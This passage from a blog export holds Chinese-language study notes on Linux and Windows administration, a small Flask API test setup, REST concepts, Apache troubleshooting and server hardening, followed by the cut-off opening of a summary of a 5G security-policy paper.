)&#x27;</span><br></pre></td></tr></table></figure></li></ul></li><li>在Linux中如何列出服務?<ul><li>去 &#x2F;etc&#x2F;init.d 查看</li><li>或 <code>systemctl list-units --type service -all</code></li><li><code>sudo systemctl | grep running</code></li><li><code>service --status-all</code></li></ul></li><li>如何查看已建立的sockets<ul><li><code>systemctl list-sockets</code></li><li><code>netstat</code></li><li><code>ss</code></li></ul></li></ul><h2 id="app-檢測"><a href="#app-檢測" class="headerlink" title="app 檢測"></a>app 檢測</h2><p><a href="https://www.mas.org.tw/spaw2/uploads/files/20190916/AppV3.1.pdf">https://www.mas.org.tw/spaw2/uploads/files/20190916/AppV3.1.pdf</a></p><h2 id="Windows-Admin"><a href="#Windows-Admin" class="headerlink" title="Windows Admin"></a>Windows Admin</h2><ul><li>安全性設定<ul><li>若要使用 Local 安全性原則主控台設定設定:<ul><li>win+R</li><li><code>secpol.msc</code></li><li>在主控台設定安全性命令下，執行下列其中一項操作：<ul><li>按一下 [帳戶政策 &gt; 以編輯 <strong>密碼政策</strong> 或 <strong>帳戶鎖定政策</strong></li><li>按一下 [本地原則 以編輯 <strong>稽核原則</strong>、<strong>使用者</strong> <strong>許可權指派</strong>或 <strong>安全性選項</strong></li></ul></li></ul></li><li>若要使用本機群組策略編輯器主控台設定安全性原則設定<ul><li>win +R</li><li><code>gpedit.msc</code></li><li>在主控台樹狀樹中，按一下 [電腦組Windows 設定 ，然後按一下[安全性設定。</li><li>執行下列其中一項：<ul><li>按一下 [帳戶政策 &gt; 以編輯 密碼政策 或 帳戶鎖定政策。</li><li>按一下 [本地原則 以編輯 稽核原則、使用者 許可權指派或 安全性選項。</li></ul></li></ul></li></ul></li></ul><h2 id="網頁測試"><a href="#網頁測試" class="headerlink" title="網頁測試"></a>網頁測試</h2><ul><li><p>有做過網頁單元測試嗎?<br>  主要架設小型的Flask Web Server<br>  然後有自己建立小型的測試用的服務<br>  <em>test_api.py</em></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import flask</span><br><span class="line">import json</span><br><span class="line">from flask import request</span><br><span class="line"></span><br><span class="line">server = flask.Flask(__name__)</span><br><span class="line">@server.route(&#x27;/login&#x27;, methods=[&#x27;get&#x27;, &#x27;post&#x27;])</span><br><span class="line">def login():</span><br><span class="line">username = request.values.get(&#x27;name&#x27;)</span><br><span class="line">pwd = request.values.get(&#x27;pwd&#x27;)</span><br><span class="line">if username and pwd:</span><br><span class="line">if username == &#x27;xiaoming&#x27; and pwd == &#x27;111&#x27;:</span><br><span class="line">resu = &#123;&#x27;code&#x27;: 200, &#x27;message&#x27;: &#x27;Login Success&#x27;&#125;</span><br><span class="line">return json.dumps(resu, ensure_ascii=False) </span><br><span class="line">else:</span><br><span class="line">resu = &#123;&#x27;code&#x27;: -1, &#x27;message&#x27;: &#x27;Login Failed&#x27;&#125;</span><br><span class="line">return json.dumps(resu, ensure_ascii=False)</span><br><span class="line">else:</span><br><span class="line">resu = &#123;&#x27;code&#x27;: 10001, &#x27;message&#x27;: &#x27;Parameter cannot be empty&#x27;&#125;</span><br><span class="line">return json.dumps(resu, ensure_ascii=False)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">server.run(debug=True, port=8888, host=&#x27;127.0.0.1&#x27;)</span><br></pre></td></tr></table></figure><p>  <img src="https://i.imgur.com/3UFNrTT.png"><br>  <em>config.ini</em></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">[HTTP]</span><br><span class="line">scheme = http</span><br><span class="line">baseurl = 127.0.0.1</span><br><span class="line">port = 8888</span><br><span class="line">timeout = 10.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[EMAIL]</span><br><span class="line">on_off = on;</span><br><span class="line">subject = Auto testing Report</span><br><span class="line">app = Outlook</span><br><span class="line">addressee = M10909302@gmail.com</span><br></pre></td></tr></table></figure><p>  <em>getpathInfo.py</em></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">def get_Path():</span><br><span class="line">path = os.path.split(os.path.realpath(__file__))[0]</span><br><span class="line">return path</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">print(&#x27;测试路径是否OK,路径为：&#x27;, get_Path())</span><br></pre></td></tr></table></figure><p>  執行結果<br>  <img src="https://i.imgur.com/SOJEwRf.png"></p><p>  <em>readConfig.py</em></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import configparser</span><br><span class="line">import getpathInfo </span><br><span class="line"></span><br><span class="line">path = getpathInfo.get_Path()</span><br><span class="line">config_path = os.path.join(path, &#x27;config.ini&#x27;)</span><br><span class="line">config = configparser.ConfigParser()</span><br><span class="line">config.read(config_path, encoding=&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">class ReadConfig():</span><br><span class="line"></span><br><span class="line">def get_http(self, name):</span><br><span class="line">value = config.get(&#x27;HTTP&#x27;, name)</span><br><span class="line">return value</span><br><span class="line">def get_email(self, name):</span><br><span class="line">value = config.get(&#x27;EMAIL&#x27;, name)</span><br><span class="line">return value</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">print(&#x27;The Baseurl Value in HTTP is：&#x27;, ReadConfig().get_http(&#x27;baseurl&#x27;))</span><br><span class="line">print(&#x27;The on_off value in EMAIL is: &#x27;, ReadConfig().get_email(&#x27;on_off&#x27;</span><br></pre></td></tr></table></figure><p>  <img src="https://i.imgur.com/KyVjXZL.png"></p><blockquote><p><a href="https://itpcb.com/a/1297735">https://itpcb.com/a/1297735</a></p></blockquote></li></ul><h2 id="RESTFUL-API"><a href="#RESTFUL-API" class="headerlink" title="RESTFUL API"></a>RESTFUL API</h2><ul><li>請問你對於RESTFul Web服務的理解是甚麼?<ul><li>RESTFul Web Service就是遵循REST風格的Web服務架構</li><li>REST(Representational State Transfer)並使用HTTP來實踐</li></ul></li><li>甚麼是REST Resource?<ul><li>每個在REST架構底下的內容都算是一種資源，這種資源有點像是OOP內的Object</li><li>資源可以是test檔、HTML頁面、圖片或是其他動態資源</li><li>REST Server提供對於這些資源的存取，並使Client可以使用這些資源</li><li>每項資源都透過URI來做標誌</li></ul></li><li>甚麼是URI?<ul><li>Uniform Resource Identidier用於在REST架構中標誌資源</li><li><code>&lt;protocol&gt;://&lt;service-name&gt;/&lt;ResourceType&gt;/&lt;ResourceID&gt;</code></li><li>兩種種類的URI: <code>URN</code>、<code>URL</code></li><li><strong>URN</strong>: Uniform Resource Name<ul><li>透過一個獨特且持久的名稱來標示資源</li></ul></li><li><strong>URL</strong>: Uniform Resource Locator<ul><li>具有有關資源位置的相關資訊</li></ul></li></ul></li><li>你對JAX-RS的理解是甚麼?<ul><li>JAX-RS&#x3D; Java API for RESRful Web Service</li></ul></li><li>可以講一些你知道常見的HTTP Status Code嗎?<ul><li>1xx - 代表資訊回覆 (這啥?</li><li>2xx - 代表成功回應</li><li>3xx - 代表重新導向</li><li>4xx - 代表client出錯</li><li>5xx - 代表server出錯</li><li>200 ok</li><li>201- CREATED 用在PUT或POST</li><li>304-NOT MODIFIED - 用於有條件的GET請求，以減少網路頻寬使用，這個response的body要是空的</li><li>400-BAD REQUEST -驗證錯誤或缺少資料</li><li>401-UNAUTHORIZED - 請求中沒有包含有效身分認證資訊</li><li>403-FORBIDDEN - 無權或禁止存取資源</li><li>404-NOT FOUND - 資源方法不可用</li><li>500-INTERNAL SERVER ERROR- 當Server在運行時跳出一些異常</li><li>502-BAD GATEWAY - Server無法從其他Server中獲得response</li></ul></li><li>可以講一些你知道常見的HTTP Methods嗎?<br>  <img src="https://i.imgur.com/PBaFMYj.png"><ul><li>GET: 從Server中擷取資訊，一種唯讀的操作</li><li>POST: 用來在server中建立資源</li><li>PUT: 用來在server中更新現有資源或取代資源</li><li>DELETE: 用來在server中刪除資源</li><li>OPTIONS: 可獲取server上現有資源的支援選項清單</li><li>HEAD: 與Get相同，但只傳送狀態行以及Header部分</li></ul></li><li>SOAP以及REST之間的差異是甚麼?</li></ul><table><thead><tr><th>SOAP</th><th>REST</th></tr></thead><tbody><tr><td>Simple Object Access Protocol</td><td>Representatioanl State Transfer</td></tr><tr><td>用來實踐web服務的協定</td><td>是一種web的架構設計風格</td></tr><tr><td>SOAP無法使用REST</td><td>REST可使用SOAP作為實踐的一部分</td></tr><tr><td>有嚴格標準</td><td>不須嚴格遵守</td></tr><tr><td>client server更加耦合</td><td>REST Client靈活，不依賴Server開發方式</td></tr><tr><td>僅支援XML</td><td>支援XML,JSON,MIME,Text等</td></tr><tr><td>SOAP使用服務介面來公開資源</td><td>使用URI來開放資源</td></tr><tr><td>作為一種協定，它定義了自己的安全措施</td><td>僅根據它用於實現的協議繼承安全措施</td></tr></tbody></table><ul><li>開發RESTful web 服務的Best Practice會是甚麼?<ul><li>開發REST API並盡可能使用JSON資料格式並進行資料的接收與回覆，因為大多數client與server之間都內置了輕鬆讀取與解析JSON物件的方式<ul><li>應用程式以JSON格式作為Response應要將Content-Type設為application&#x2F;json</li><li>某些HTTP Client端會去察看Response Header的值來去做解析</li><li>resquest header中的Content-Type:要設成application&#x2F;json</li></ul></li><li><strong>在命名資源endpoint的時候應該使用複數名詞，而不是動詞，API Endpoint應要簡短、易於理解</strong><ul><li>不用動詞是因為HTTP Method中已經描述了請求行為為何了</li><li>常用的HTTP Verb&#x2F;Methods: GET、POST、PUT、DELETE</li></ul></li><li>使用nesting來表示資源的層次結構<ul><li>ex. GET for URI: &#x2F;authors&#x2F;:id&#x2F;address</li><li>別太多層</li></ul></li><li>錯誤處理應透過返回應用程式適當的error code來處理，REST中也定義了適當的HTTP Status Code可根據不同場景來一起發送<ul><li>error code要搭配適當錯誤訊息，幫助開發人員糾正措施，但別太詳細防止駭客知道太多</li><li>400-Bad Request</li><li>401-Unauthorized</li><li>403-Forbidden</li><li>404-Not Found</li><li>500-Internal Server Error</li><li>502-Bad Gateway</li><li>503-Service Unavailable</li></ul></li></ul></li><li>你了解哪些分散式系統架構?<ul><li>我知道用來maintain以及運行分散是系統的技術，就Kubernetes</li></ul></li><li><a href="https://searchapparchitecture.techtarget.com/definition/software-stack">那甚麼是Software Stack?</a><br>  <img src="https://i.imgur.com/NOpfrAK.png"><ul><li>是一堆獨立組件的集合，他們協同工作來完成應用程式的執行</li><li>這些組件可能包含:OS、協定、runtime環境、Library、DB和Function Call</li><li>根據所需運行的應用程式，至少會是OS、DB、支援編寫程式的工具和應用程式</li></ul></li><li>那甚麼是Solution Stack?<ul><li>要開發一款網路應用程式，會需要定義目標OS、網頁server、DB以及語言</li><li>或要定義OS、Middleware、DB及應用程式，有時也會將硬體涵蓋在內</li><li>舉例:<ul><li>BCHS<ul><li>OpenBSD</li><li>C</li><li>httpd</li><li>SQLite</li></ul></li><li>ELK<ul><li>Elasticsearch</li><li>Logstash</li><li>Kibana</li></ul></li><li>Ganeti<ul><li>Xen或KVM</li><li>搭配LVM的Linux</li><li>DRBD</li><li>Ganeti</li><li>Ganeti Web Manager</li></ul></li><li>LAMP<ul><li>Linux</li><li>Apache</li><li>MySQL&#x2F;MariaDB</li><li>Perl、PHP、Python</li></ul></li><li>LAPP<ul><li>Linux</li><li>Apache</li><li>PostgreSQL</li><li>Perl、PHP、Python</li></ul></li><li>LLMP<ul><li>Linux</li><li>Lighttpd</li><li>MySQL&#x2F;MariaDB</li><li>Perl、PHP、Python</li></ul></li><li>MEAN<ul><li>MongoDB</li><li>Express.js</li><li>Angular.js</li><li>Node.js</li></ul></li><li>MERN<ul><li>MongoDB</li><li>Express.js</li><li>React.js</li><li>Node.js</li></ul></li><li>MEVN<ul><li>MongoDB</li><li>Express.js</li><li>Vue.js</li><li>Node.js</li></ul></li></ul></li></ul></li></ul><h2 id="Apache-Troubleshooting"><a href="#Apache-Troubleshooting" class="headerlink" title="Apache Troubleshooting"></a><a href="https://www.acunetix.com/websitesecurity/troubleshooting-tips-for-apache/">Apache Troubleshooting</a></h2><h3 id="httpd-conf-設定錯誤"><a href="#httpd-conf-設定錯誤" class="headerlink" title="httpd.conf 設定錯誤"></a>httpd.conf 設定錯誤</h3><ul><li>Syntax Error<ul><li>Linux上需使用 <code>apachectl -configtest</code>來檢測Syntax Error</li><li>Windows系統上的Apache須先到Apache的bin目錄上，然後執行 <code>httpd.exe -t</code></li><li>修正問題後重啟Apache並重新透過上述指令做檢查</li></ul></li></ul><h3 id="Vulenrabilities"><a href="#Vulenrabilities" class="headerlink" title="Vulenrabilities"></a>Vulenrabilities</h3><ul><li>使用最新版本的Apache</li><li>使用弱掃工具去檢查</li><li>隨時查看最新的CVE，並上Patch</li></ul><h3 id="Apache-HTTP-Server-Logs"><a href="#Apache-HTTP-Server-Logs" class="headerlink" title="Apache HTTP Server Logs"></a>Apache HTTP Server Logs</h3><p>應分析Apache HTTP Server中的<strong>error logs</strong>，<strong>它提供了有關 Web 服務器上發生的任何錯誤的詳細資訊</strong> 路徑: <code> /var/log/apache2/error.log</code>、<code>/etc/apache2/apache2.conf</code>、<code>/etc/httpd/conf/httpd.conf</code></p><p>預設會放在Apache安裝目錄中的log目錄中的<strong>error_log</strong>檔案中<br>也可從httpd.conf中去設定要紀錄哪一類型的錯誤，httpd.conf中有8個log級別的資訊<br>除了error log以外還提供access log來紀錄Server處理過的所有請求。<br>這些日誌還可以對可能導致問題的原因提供額外的解釋，還可以補充錯誤日誌中的資訊。</p><h3 id="使用Mod-log-forensic-模組"><a href="#使用Mod-log-forensic-模組" class="headerlink" title="使用Mod_log_forensic 模組"></a>使用Mod_log_forensic 模組</h3><p><code>mod_log_forensic</code>模組用於提供client端請求的<strong>forensic log</strong><br>這包含了處理前與處理後的請求，並使用相同ID來引用相同的請求，因此可以輕鬆識別由特定請求引發的任何問題<br><strong>可以用來分析哪些請求會導致Web Server崩潰</strong><br>若要啟用這個模組，需要在 <code>Apache httpd.conf</code>文件中設定:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LoadModule log_forensic_module_forensic.so</span><br><span class="line">LoadModule uniques_id_module modules/mod_unique_id.so</span><br><span class="line">ForensicLog logs/forensic_log</span><br></pre></td></tr></table></figure><p>也可將 <strong>check_forensic</strong>的bash腳本與 mod_log_forensic模組結合使用，以列出在forensic log中發現任何不完整的請求<br><code>check_forensic &lt;log_file&gt;</code></p><h3 id="使用-mod-whatkilledus-module"><a href="#使用-mod-whatkilledus-module" class="headerlink" title="使用 mod_whatkilledus module"></a>使用 mod_whatkilledus module</h3><p>當事情非常糟糕且Apache Server崩潰時，<code>mod_whatkilledus</code>模組可用於紀錄有關崩潰的詳細技術資訊以及導致發生crash的原始client端請求。</p><p>此外若啟用了 <code>mod_backtrace</code>模組，這將包含顯示故障點的回溯，這對於在滿足某些條件後使用回溯註釋錯誤日誌很有用</p><p>對於Unix系統，只有在 httpd建構中啟用了 <code>--enable-exception-hook</code> 參數時，這些模組才會起作用。而對於Windows系統則沒有特殊要求</p><ul><li><code>mode_whatkilledus</code> 以及 <code>mod_backtrace</code> 的說明文件: <a href="https://emptyhammock.com/projects/httpd/diag/quick-start.html">https://emptyhammock.com/projects/httpd/diag/quick-start.html</a></li></ul><h3 id="使用第三方模組"><a href="#使用第三方模組" class="headerlink" title="使用第三方模組"></a>使用第三方模組</h3><p>使用第三方模組可能會導致在安裝Apache HTTP Server時遇到問題<br>因此應該禁用第三方模組，並檢查問題是否可以重現，若禁用模組可以解決問題則一個一個重起每個模組，以便確定是哪個模組帶來的原因</p><h3 id="將Apache-HTTP-Server做為單一process並使用Debug工具"><a href="#將Apache-HTTP-Server做為單一process並使用Debug工具" class="headerlink" title="將Apache HTTP Server做為單一process並使用Debug工具"></a>將Apache HTTP Server做為單一process並使用Debug工具</h3><p>典型的Apache HTTP Server安裝會運行多個process<br>但如果要troubleshooting最好是以單一process運行<br>可在啟動apache時候使用X選項<br><code>$ httpd -X</code> 這可使Apache以單一process模式來啟動，這代表Apache不會去fork出新的chidren或與終端detach<br>這樣所有流量與通訊都將通過一個單一的process，就能在debugger(ex. gdb)底下運行apache httpd並取得崩潰的bracktace並強制server去行coredump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gdb httpd</span><br></pre></td></tr></table></figure><p>接著就是透過gdb先去設breakpoint，然後去做單步追蹤，一行一行看可能錯在哪?</p><h3 id="腳本執行問題"><a href="#腳本執行問題" class="headerlink" title="腳本執行問題"></a>腳本執行問題</h3><p>動態內容通常由 Apache HTTP Server通過 <code>mod_cgi</code>模組執行的腳本提供<br>這個模組包含自己的logging機制用來記錄在腳本執行期間發生的任何錯誤</p><p>啟用<strong>ScriptLog</strong>指令後，mod_cgi將記錄任何未按照預期執行的腳本的輸出，包含<br>Server Response Code，收到的請求以及任何向客戶端發出的任何回應</p><p>要啟用此功能需要修改 httpd.conf文件，並指定ScriptLog指令和保存log的位置<br><code>ScriptLog logs/cgi_log</code></p><h2 id="IIS-Troubleshooting"><a href="#IIS-Troubleshooting" class="headerlink" title="IIS Troubleshooting"></a><a href="https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms524996(v=vs.90)">IIS Troubleshooting</a></h2><h2 id="Server端安全"><a href="#Server端安全" class="headerlink" title="Server端安全"></a>Server端安全</h2><ul><li>Server端有甚麼安全建議?<ul><li>移除不必要服務<ul><li>默認安裝有時候會安裝許多不必要的功能ex. 遠端註冊、printer server…etc</li><li>服務越多，開放的port就越多，因此會暴露更多風險</li><li>關閉server中的非必要服務</li></ul></li><li>確保遠端存取的保護措施<ul><li>若web admin需要遠端登入Web server，則需要使用隧道和加密協定來確保遠程連線獲得適當防護 </li><li>在設備或軟體上使用安全token </li><li>遠端存取應限制特定數量IP以及帳戶</li></ul></li><li>分離開發&#x2F;測試&#x2F;生產環境<ul><li>由於開發人員在生產服務器上開發更新版本的 Web 應用程序更容易、更快捷，因此 Web 應用程序的開發和測試直接在生產服務器本身上完成是很常見的。</li><li>有可能會在網路上蒐到特定網站的更新版本，或在&#x2F;test&#x2F;、&#x2F;new&#x2F;或其他類似子目錄底下發現不應該給公眾知道的內容 </li><li>所以如果在同台Server上同時開發、測試跟生產，如果權限沒設好而且早期開發階段安全性容易沒做好，容易被打穿網站</li></ul></li><li>Web應用內容以及Server Script安全<ul><li>web應用或網站文件應該要位於OS系統文件、log文件以外的獨立分區或driver上</li><li>因為如果攻擊者獲得web目錄存取權限，可能就可以透過其他漏洞去做提權並存取整個磁碟上的資料</li></ul></li><li>確保適當權限與特權<ul><li>始終分配運行特定網路服務所需的最權限</li></ul></li><li>按時安裝所有patch</li><li>監控或audit server <ul><li>應經常監控和檢查所有網路服務log、網站access log、DB Server log(ex. Microsoft SQL Server、MySQL、Oracle)和OS Log</li><li>若log中發現奇怪活動，應該立刻去解決它</li></ul></li><li>用戶帳戶管理<ul><li>禁用未使用的默認帳戶<ul><li><code>userdel</code> 指令</li></ul></li><li>每個帳戶要設定它應有的正確權限</li></ul></li><li>刪除未使用的模組和應用程式<ul><li>Apache預設會安裝多預定義的模組 </li><li>典型Web Server不會使用這些模組，因此需要關閉，防止針對此類模組的攻擊</li></ul></li><li>使用Network Sever軟體所提供的安全工具<ul><li>Mircosoft 發布許多工具來幫助admin來保護IIS Web Server安裝</li><li>Apache也有提供 <strong>mod_security</strong>模組</li></ul></li><li>使用外部scanner<ul><li>nessus</li><li>nikto</li><li>或其他弱掃工具</li></ul></li></ul></li></ul><h2 id="Log檔案"><a href="#Log檔案" class="headerlink" title="Log檔案"></a>Log檔案</h2><p>系統錯誤資訊 - <code>/var/logs/syslog</code> 或 <code>/var/logs/messages</code><br>與登入帳密有關的log - <code>/var/logs/secure</code> 或 <code>/var/logs/auth.loh</code>(Debian)<br>紀錄哪個服務的log會被放在哪? - <code>/etc/rsyslog.conf</code>，會被放在<code>/etc/rsyslog.d</code> 底下</p><h3 id="Syslog等級"><a href="#Syslog等級" class="headerlink" title="Syslog等級"></a>Syslog等級</h3><p><img src="https://i.imgur.com/GxaNR3I.png"></p><h3 id="Systemcall"><a href="#Systemcall" class="headerlink" title="Systemcall"></a>Systemcall</h3><h2 id="C-x2F-C"><a href="#C-x2F-C" class="headerlink" title="C&#x2F;C++"></a>C&#x2F;C++</h2><ul><li>如果程式中使用malloc但沒有free掉會怎樣?<ul><li>heap memory會一直被占著，直到程式結束，不會自動釋放</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
          <category> Troubleshooting </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network </tag>
            
            <tag> Linux </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Security policies definition and enforcement utilizing policy control function framework in 5G</title>
      <link href="/posts/de3933f9.html"/>
      <url>/posts/de3933f9.html</url>
      
        <content type="html"><![CDATA[<style>    :root{    --maincolor: #50fa7b;    }   .info{    padding: 15px;    margin-bottom: 20px;    color: #ffffff;    border: 1px solid transparent;    border-radius: 10px;    background-color: #343232;    border-color: #b8bdb4;   }   .special{        border-bottom: 3px solid var(--maincolor);        color: inherit;        text-decoration:none;   }   .newbold{        color: #ffffff;        font-weight: bold;        text-decoration:none;   }   a{    color: #337ab7;    text-decoration: none;   }</style><h2 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h2><p>本篇討論的是3GPP定義的5G System(5GS)範圍之中的網路安全議題</p><h3 id="5G標準制定"><a href="#5G標準制定" class="headerlink" title="5G標準制定"></a>5G標準制定</h3><p>許多組織或會議對於開發5G架構有卓越貢獻，尤其是在安全層面:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- ITU</span><br><span class="line">- ETSI</span><br><span class="line">- IETF</span><br><span class="line">- NGMN</span><br><span class="line">- 5G-PPP</span><br><span class="line">- NIST</span><br><span class="line">- GSMA等等</span><br></pre></td></tr></table></figure><p>有些負責在特定infra上像是關鍵基礎設施，其餘則是為特定用例開發安全標準</p><blockquote><p>S3A Working Group → 定義5G網路 end to end 安全層面</p></blockquote><h3 id="5GS"><a href="#5GS" class="headerlink" title="5GS"></a>5GS</h3><p>5G System &#x3D; Access Network + Core Network + UE<br>System Arcitecture → Service-Based Architecture → Is composed of multiple NFs<br>SBA架構中，不同的NFs之間的互動可以兩個NF的點對點的參考點來表示<br><strong>SBI(Service-based Interface)</strong> 用來表示一個給定的NF要如何提供或開放一組服務</p><p><strong>Policy Control Function(PCF)</strong> 是一個網路功能用以提供統一且一致的框架來定義任何類型的策略，在前幾代行動網路中，PCF僅用於QoS或計費方面的策略制定</p><p>5G架構中增加了對於網路資料分析的服務，藉由一個新的NF，NWDAF(Network Data Analytics Services)<br>用於</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 負載級別(Load Level)資訊</span><br><span class="line">2. 服務體驗</span><br><span class="line">3. 網路效能</span><br><span class="line">4. 異常行為</span><br></pre></td></tr></table></figure><p><span class="special">PCF可以訂閱與此類資訊相關的網路分析通知，並用於計算或更新策略，但這目前尚未標準化</span><br>新的統一策略控制框架與5G系統以及增強的資料分析實體之間並無建立明顯的連結，而本篇論文的結果可以幫助這三項區域變得更加緊密</p><p>主要目標是要找到一個有效的security enforcement schema用以彈性地建立新的安全策略，並動態地回應持續變化地安全環境，橫跨5G end to end 架構。</p><p>對於橫跨5G系統地Security Enforcement應在<strong>TSG-SA</strong> 層級被討論</p><p>5GS架構中對於User Plane Security Enforcement，會是基於UE與基站之間的air interface其中地機密性與完整性演算法是否啟用</p><p>對於UP的完整性保護演算法是可以選擇性啟用的(例如各切片可以是否啟用)</p><h3 id="網路切片"><a href="#網路切片" class="headerlink" title="網路切片"></a>網路切片</h3><p><span class="special">個別網路切片提供不同種服務可能會有著不同的安全需求，並採用不同安全協定與方法；因此對於不同的網路切片提供不同層級的安全防護會是關鍵</span></p><p>對於安全加密演算法的使用也是選擇性的(e.g. 128bits vs 256 bits key length)<br>像是對於關鍵基礎設施的安全需求以及enhanced Mobile Broadband 大量使用場景的安全需求也有所不同</p><p>將 QoS 原則應用於安全，目標應是利用統一的策略控制框架，並利用新的資料分析功能作為對於網路以及UE知識基礎，在 5G end to end 架構中實現有效的安全策略定義和執行</p><p>現行對於電信網路的保護策略不外乎防火牆、IDS、DDOS保護系統等等，並被廠商的特定管理工具所管理<br>而這些安全功能是為了保護整個網路或根據他們在網路中的定位，而未考慮個別UE</p><ol><li>偵測到單一UE發生安全問題的能力</li><li>應用解決措施到單一UE的方式到目前都是個問題</li></ol><p>本篇研究補足了這些機制，並從end to end網絡的角度豐富了安全性，並提共適當的粒度(granularity) 來考慮個別UE的安全策略<br>→對於 uRLLC 以及 mMTC 部屬場景有幫助</p><p><img src="https://i.imgur.com/BOTV0hU.png"></p><h2 id="2-Challenges-to-apply-end-to-end-security-enforcement-in-5G"><a href="#2-Challenges-to-apply-end-to-end-security-enforcement-in-5G" class="headerlink" title="2. Challenges to apply end to end security enforcement in 5G"></a>2. Challenges to apply end to end security enforcement in 5G</h2><p>為了實踐end to end security enforcement，有四大挑戰要解決</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 為Security Enforcement應用QoS原則</span><br><span class="line">- 會話管理和用戶平面</span><br><span class="line">- 策略控制</span><br><span class="line">- 網路分析</span><br></pre></td></tr></table></figure><h3 id="2-1-Challenges-to-apply-QoS-principles-to-security-enforcement"><a href="#2-1-Challenges-to-apply-QoS-principles-to-security-enforcement" class="headerlink" title="2.1 Challenges to apply QoS principles to security enforcement"></a>2.1 Challenges to apply QoS principles to security enforcement</h3><p>當根據業務需求（例如在垂直市場中產生）將 QoS 實施基本原則應用於安全實施時，主要困難之一是能夠以與 QoS 在網絡中量化的類似方式來衡量安全特性</p><p>QoS 配置文件被很好地定義為應用於 QoS 流的一組 QoS 參數（QoS 流是分組數據單元 (PDU) 會話中 QoS 區分的最細粒度）。這種參數化是定量的，即可以用數字來衡量。例如，5G QoS 標識符是一個由標量表示的參數，用作 5G QoS 特性（如調度、權重、准入閾值等）的參考。甚至還有預先配置的標準化值。但是，如何在 5G 架構中構建安全配置文件，如何建立完整性保護、機密性保護、訪問控製或惡意軟件檢測等方面的量化安全參數化？我們解決這個問題的提議在第 3.1 節中提出。</p><h3 id="2-2-Challenges-at-session-management-level-to-enforce-security-controls"><a href="#2-2-Challenges-at-session-management-level-to-enforce-security-controls" class="headerlink" title="2.2  Challenges at session management level to enforce security controls"></a>2.2  Challenges at session management level to enforce security controls</h3><p>SMF負責接收由UE所發送來的建立PDU Session的請求<br>然而現今的PDU 請求並沒有包含任何安全參數</p><p>所以UE請求<strong>特定的</strong> 5G UP安全服務，即”安全的PDU”，是不可能的<br>然後像是政府關鍵基礎設施可能就有需求是，應提供特殊安全措施在UE與Data Networl之間的PDU Session<br>例如某些<strong>資料無線電承載(Data Radio Bearer)</strong> 支援某些服務中的強加密演算法或更長的加密金鑰</p><p>SMF在建立PDU會話時，根據來自</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- UDM的Subscriber資訊</span><br><span class="line">- 每個DNN/SMF中切片的本地配置UP安全策略</span><br><span class="line">- 每個UE所支援的最高Data Rate</span><br></pre></td></tr></table></figure><p>用以在PDU Session建立UP Security Enforcement 來在每個DRB中提供完整性保護<br>SMF的本地配置被認為是全局適用(global 